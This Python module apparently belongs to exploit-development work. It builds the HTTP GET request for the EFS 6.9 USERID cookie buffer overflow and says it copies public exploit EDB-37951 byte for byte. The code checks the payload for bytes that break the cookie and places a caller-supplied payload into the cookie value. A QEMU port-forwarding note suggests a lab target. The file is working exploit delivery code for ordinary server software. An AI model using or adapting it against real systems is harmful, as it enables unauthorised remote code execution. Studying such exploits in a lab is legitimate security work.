"""HTTP cookie wrapper for the EFS 6.9 USERID overflow.

Envelope mirrors EDB-37951 byte-for-byte except the payload bytes that
go into the `UserID=` cookie value, which the caller supplies.
"""
from __future__ import annotations

COOKIE_BAD_BYTES = frozenset(b"\x00\x0a\x0d\xff\x20\x3b")


def build_http_request(
    host: str,
    port: int,
    payload: bytes,
    *,
    host_port: int | None = None,
) -> bytes:
    """Build the GET /vfolder.ghp request that triggers the BOF.

    `port` is the TCP connect port (e.g. 18080 when using QEMU hostfwd).
    `host_port` is the port embedded in the HTTP Host header (guest service
    port, usually 80). Defaults to `port` when omitted.
    """
    if not host:
        raise ValueError("host must be non-empty")
    if not (0 < port < 65536):
        raise ValueError(f"port out of range: {port}")
    header_port = port if host_port is None else host_port
    if not (0 < header_port < 65536):
        raise ValueError(f"host_port out of range: {header_port}")
    if not payload:
        raise ValueError("payload must be non-empty")

    illegal = [(i, b) for i, b in enumerate(payload) if b in COOKIE_BAD_BYTES]
    if illegal:
        off, b = illegal[0]
        raise ValueError(
            f"payload contains cookie bad byte 0x{b:02x} at offset {off}"
        )

    # Envelope matches EDB-37951 (Host: without space; Conection typo).
    header = (
        f"GET /vfolder.ghp HTTP/1.1\r\n"
        f"User-Agent: Mozilla/4.0\r\n"
        f"Host:{host}:{header_port}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        f"Accept-Language: en-us\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Referer: http://{host}/\r\n"
        f"Cookie: SESSIONID=1337; UserID="
    ).encode("ascii")
    trailer = b"; PassWD=;\r\nConection: Keep-Alive\r\n\r\n"
    return header + payload + trailer
